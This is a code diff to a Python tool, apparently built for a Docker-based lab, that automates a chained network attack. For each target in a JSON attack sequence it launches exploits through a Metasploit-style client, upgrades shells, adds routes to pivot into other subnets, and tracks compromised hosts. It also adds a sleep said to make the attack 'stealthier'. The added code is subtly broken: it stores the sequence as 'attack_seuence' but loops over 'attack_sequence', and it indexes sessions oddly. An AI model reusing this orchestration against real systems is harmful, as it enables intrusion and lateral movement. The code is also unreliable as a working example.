@@ -107,8 +107,64 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
     elif(attack_sequence_file == "new_attack_sequence.json"):
         print(f"{C.COL_YELLOW}\nReading attack sequence from Attack_sequence.json and attacking with that")
         print(f"{C.COL_YELLOW}ATTACK SEQUENCE:")
-        prova_sequenza = sequence_loader.load_attack_sequence(attack_sequence_file)
+          
+        # Viene estratta la sequenza di attacchi dalla funzione del modulo sequence_loader
+        attack_seuence = sequence_loader.load_attack_sequence(attack_sequence_file)
         sequence_loader.print_attack_sequence(attack_sequence_file)
+
+        # Itera direttamente su ogni step della sequenza di attacco
+        for i, (attack_name, target_ip, other_attribute) in enumerate(attack_sequence, start=1):
+            print(f"{C.COL_GREEN}[STEP {i}] Attacking IP: {target_ip} with {attack_name}{C.COL_RESET}")
+            
+            if atk_sess:
+                met_sess = mc.upgrade_shell(atk_sess)
+
+            # Gestione di una subnet diversa
+            if target_ip in other_subnet:
+                if atk_sess is None:
+                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
+                    return
+                else:
+                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
+                    mc.route_add(met_sess["id_sess"], target_ip)
+                    router = met_sess
+
+            # Estrae la porta LPORT per il target corrente
+            LPORT = None
+            for p in C.TARGETS_DOCKERS.get(target_ip, []):
+                LPORT = p["exposed_port"]
+                break
+
+            # Crea l'oggetto dell'attacco e lo esegue
+            print(f"{C.COL_GREEN}[+] Initiating attack {attack_name} on {target_ip} with attribute: {other_attribute if other_attribute else 'N/A'}{C.COL_RESET}")
+            attack_obj = attack_db.create_attack(attack_name, target_ip, attacker_ip, LPORT)
+
+            if isinstance(attack_obj, SshAttack) and OOBSession is None:
+                print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
+                continue
+
+            session = mc.attempt_attack(attack_obj)
+
+            # Gestione dei risultati dell'attacco
+            if isinstance(attack_obj, NotImplementedAttack):
+                print(f"{C.COL_RED}[-] attack not implemented")
+            elif session:
+                atk_sess = session[1:2][0]["id_sess"]
+                print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
+                compromised_machines.add(target_ip)
+                if target_ip in uncompromised_machines:
+                    uncompromised_machines.remove(target_ip)
+            else:
+                print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
+
+            # Pausa stealth opzionale tra gli attacchi
+            if stealth_sleep:
+                print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
+                sleep(stealth_sleep)
+
+            # Separatore per chiarezza nel log degli attacchi
+            print(f"{C.COL_GREEN}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
+
 
         
     
@@ -122,6 +178,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
         with open(attack_sequence_file) as f:
             attack_data = json.load(f)['attack_sequence']
         attack_sequence = []
+
         for ip, attacks in attack_data.items():
             if ip == '' or ip not in uncompromised_machines:
                 continue  
